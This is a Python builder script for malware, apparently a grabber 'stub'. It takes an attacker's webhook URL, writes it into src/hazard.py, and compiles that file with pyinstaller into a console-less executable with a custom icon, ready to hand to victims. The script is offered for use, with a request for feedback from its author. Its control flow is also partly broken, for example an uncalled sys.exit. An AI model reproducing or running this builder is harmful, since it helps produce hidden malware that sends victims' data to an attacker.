import time
import os
import sys

os.system("cls")
print("installing requirements...")
time.sleep(2)
os.system("pip install -r requirements.txt")
os.system("cls")

webhook = input("whats your webhook? ")
search_text = "YOUR_WEBHOOK_HERE"
replace_text = webhook

with open(r'src/hazard.py', 'r') as file:
  
    data = file.read()
  
    data = data.replace(search_text, replace_text)
  
with open(r'src/hazard.py', 'w') as file:
  
    file.write(data)

print("added your webhook to the file")
time.sleep(2)
    
name = input("name of the file that will be created? ")
print("sounds guud")
time.sleep(2)
    
build = input("ready to create your stub? y/n ")
if build == "y":
    print("starting to build in 3 secs")
    time.sleep(3)
    print("building started...")
    print("ctrl + c to cancel, may break the application")
    time.sleep(2)
     
    os.system(f"pyinstaller --onefile --noconsole -n {name} -i build/exe.ico src/hazard.py")
    os.system("cls")
        
if build == "n":
    print("ok bitch")
    time.sleep(3)
    sys.exit
        
else:
    print("wrong input lol, try again...")
    time.sleep(2)
    build
    
os.remove(f"{name}.spec")
os.remove(fr"build/{name}")
print("done...")
print("stub was built successfully lel")
print("check the dist directory for the exe")
print("would love to hear some feedback :) gum#1085")